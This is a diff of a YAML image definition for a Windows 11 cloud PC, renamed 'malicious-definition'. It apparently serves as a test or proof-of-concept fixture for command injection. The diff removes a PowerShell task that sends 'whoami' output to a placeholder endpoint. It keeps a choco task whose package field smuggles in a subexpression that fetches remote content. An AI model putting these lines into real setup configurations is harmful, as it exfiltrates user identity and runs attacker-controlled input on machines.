@@ -1,4 +1,4 @@
-name: sample
+name: malicious-definition
 
 image: microsoftwindowsdesktop_windows-ent-cpc_win11-22h2-ent-cpc-m365
 
@@ -7,9 +7,6 @@ hostInformation: general_i_32c128gb2048ssd_v2
 supportsHibernation: false
 
 setupTasks:
-  - task: powershell
-    inputs:
-      command: $var=$(whoami); Invoke-WebRequest -Uri http://{CUSTOMENDPOINT}/iex2var1 -Method POST -Body $var;
   - task: choco
     inputs:
       package: $(Invoke-RestMethod -Uri "http://{CUSTOMENDPOINT}/package" -Method Get;)
